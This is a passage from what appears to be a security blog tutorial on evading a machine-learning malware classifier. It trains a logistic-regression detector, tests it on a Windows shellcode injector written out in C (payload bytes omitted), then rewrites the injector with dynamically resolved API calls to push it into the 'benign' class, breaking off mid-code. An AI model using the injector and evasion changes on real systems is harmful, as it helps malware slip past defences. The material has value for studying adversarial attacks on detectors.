-->
</span></span><span class="highlight-line"><span class="highlight-line-content">    torch.save(model.state_dict(), "logistic_pe_model.pth")<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    print("\nModel saved to logistic_pe_model.pth")<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    # Also save the scaler so you can preprocess test data consistently<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    import joblib<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    joblib.dump(scaler, "scaler.pkl")<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    print("Scaler saved to scaler.pkl")</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Just like during training time, the scaler ensures that new data is transformed into the correct scale for our model.</p><h2 id="learning-about-the-classifier" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://steve-s.gitbook.io/0xtriboulet/artificial-intelligence/evading-the-machine#learning-about-the-classifier"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_5l8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_5l8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Learning About the Classifier</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">We now have our model and scaler saved into reusable files. One thing we can do at this point is actually graph the logistic regression into our feature space. When we do this for a classification problem, this boundary is called the <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://en.wikipedia.org/wiki/Decision_boundary"><i class="font-italic">decision boundary</i><svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_4pn8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_4pn8qav5ukqiv5ubsnpfivb_)"></rect></svg></a>. In our case, because our example dataset is in Euclidean space, we can visualize our decision boundary.</p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://steve-s.gitbook.io/0xtriboulet/~gitbook/image?url=https%3A%2F%2F4223093509-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FsOcwlgEs4z7TZgzT3Eq0%252Fuploads%252F1kLXRikExagWMsOyGKNn%252Funknown.png%3Falt%3Dmedia%26token%3Deecc07b5-73cb-4cf0-8c85-ebc05c4922cd&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=b660ba0c&amp;sv=2" width="719" height="622"></div></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-center self-center justify-center"><i class="font-italic">Graph of Scaled Entropy v Strings Density v Log(Size) with Decision Boundary</i></p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">In this way, this decision boundary is the plane that separates the benign and malicious points in our feature space. It is effectively<i class="font-italic"> the model</i> that resulted from applying the logistic regression algorithm to our training data.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">To test how our model performs on new data, we can quickly build a sample injector.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_218qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">// clang injector.cxx -o injector.exe<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#include &lt;windows.h&gt;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#include &lt;stdio.h&gt;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">UCHAR payload[] = {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">[...snip...]<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">};<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">INT main(){<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	PVOID  pPayload      = NULL;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	HANDLE hThread       = NULL;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	SIZE_T szPayloadSize = sizeof(payload);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	pPayload = VirtualAlloc(NULL, szPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">	RtlCopyMemory(pPayload, payload, szPayloadSize);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	hThread  = CreateThread(NULL, 0x0, (LPTHREAD_START_ROUTINE) pPayload, NULL, 0x0, NULL);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	WaitForSingleObject(hThread, INFINITE);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	return 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">We can then pass in our <i class="font-italic">injector.exe</i> to the feature extractor and scaler, and finally pass the feature vector into the model for classification.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_258qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content"># --------------------------------------------------<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content"># Classification Logic<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content"># --------------------------------------------------<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">def classify(binary_path):<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    # Load scaler<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    scaler = joblib.load("scaler.pkl")<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    # Extract features<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    raw_features = extract_features(binary_path).reshape(1, -1)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    features = scaler.transform(raw_features)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    # Load model<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    input_dim = features.shape[1]<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    model = LogisticRegression(input_dim)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    model.load_state_dict(torch.load("logistic_pe_model.pth", map_location="cpu"))<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    model.eval()<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    # Convert to tensor<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    X = torch.tensor(features.astype("float32"))<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    # Run model<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    with torch.no_grad():<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        logits = model(X)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        prob = torch.sigmoid(logits).item()<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    # Threshold at 0.5<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    label = 1 if prob &gt;= 0.5 else 0<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    verdict = "MALWARE" if label == 1 else "BENIGN"<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    print(f"File: {binary_path}")<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    print(f"Probability of malware: {prob:.4f}")<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    print(f"Classification: {verdict}")</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">When we do that, we see that our model correctly classifies our injector as malicious.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_298qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">model&gt;python .\classify.py .\injector.exe<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">File: .\injector.exe<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Probability of malware: 0.6034<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Classification: MALWARE</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Our model is not very good, but again it works well enough for demonstrative purposes. Just like with our decision boundary, we can also plot the features of our injector in our three-dimensional feature space.</p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://steve-s.gitbook.io/0xtriboulet/~gitbook/image?url=https%3A%2F%2F4223093509-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FsOcwlgEs4z7TZgzT3Eq0%252Fuploads%252FoP0RZIdIhkZ8jlFKEYmG%252Funknown.png%3Falt%3Dmedia%26token%3D970b0251-3c0d-4fbd-8157-4cbbc4c2c0ad&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=9beb4ba7&amp;sv=2" width="572" height="567"></div></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-center self-center justify-center"><i class="font-italic"><strong class="font-bold">Injector.exe </strong></i><i class="font-italic">plotted into our feature space (rotated)</i></p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">From this perspective, we can see that our injector binary is on the malicious side of the decision boundary. Fortunately for us, our binary is pretty close to the boundary, which means that with a little bit of manipulation, we should be able to change that.</p><h2 id="evading-the-classifier" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://steve-s.gitbook.io/0xtriboulet/artificial-intelligence/evading-the-machine#evading-the-classifier"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_6j8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_6j8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Evading the Classifier</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Based on the perspective of the previous graph, we can intuitively understand that to induce a misclassification of our binary, we can move upwards or we can move right. We can move upwards by increasing the size of our binary, or move right by increasing the string density. Now these features are slightly self-regulating; if you bloat the binary without increasing the number of strings, you may worsen your classification. However, before scaling, the vertical log(size) axis is logarithmic in scale, and the string density is not. This means we can pretty safely decrease the size of our binary and increase the number of strings to move right and cross the decision boundary into the benign space.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">One way of doing that is by replacing our WinAPI calls with dynamically resolved calls to the same APIs, and explicitly linking to the CRT to remove some of the bloat of the standard library.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_2p8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">// clang .\injector.cxx -o injector_1.exe -nostdlib -lmsvcrt -lkernel32<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#include &lt;windows.h&gt;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#include &lt;stdio.h&gt;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">__attribute__((section(".text"))) UCHAR payload[] = {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">[...snip...]<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">};<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">typedef LPVOID (WINAPI * VirtualAlloc_t)(<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    LPVOID lpAddress,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    SIZE_T dwSize,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    DWORD  flAllocationType,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    DWORD  flProtect<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">typedef HANDLE (WINAPI * CreateThread_t)(<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	LPSECURITY_ATTRIBUTES   lpThreadAttributes,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	SIZE_T                  dwStackSize,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	LPTHREAD_START_ROUTINE  lpStartAddress,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	__drv_aliasesMem LPVOID lpParameter,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	DWORD                   dwCreationFlags,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	LPDWORD                 lpThreadId<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">typedef DWORD (WINAPI * WaitForSingleObject_t)(<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	HANDLE hHandle,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	DWORD dwMilliseconds<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">INT main(){<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	PVOID  pPayload      = NULL;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	HANDLE hThread       = NULL;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	SIZE_T szPayloadSize = sizeof(payload);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	HMODULE hKernel32                           = NULL;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	VirtualAlloc_t        pVirtualAlloc         = NULL;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	CreateThread_t        pCreateThread         = NULL;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	WaitForSingleObject_t pWaitForSingleObject  = NULL;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	hKernel32            = GetModuleHandleA("kernel32.dll");<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	pVirtualAlloc        = (VirtualAlloc_t) GetProcAddress(hKernel32, "VirtualAlloc");<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	pCreateThread        = (CreateThread_t) GetProcAddress(hKernel32, "CreateThread");<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	pWaitForSingleObject = (WaitForSingleObject_t) GetProcAddress(hKernel32, "WaitForSingleObject");<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	pPayload = pVirtualAlloc(NULL, szPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">	RtlCopyMemory(pPayload, payload, szPayloadSize);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
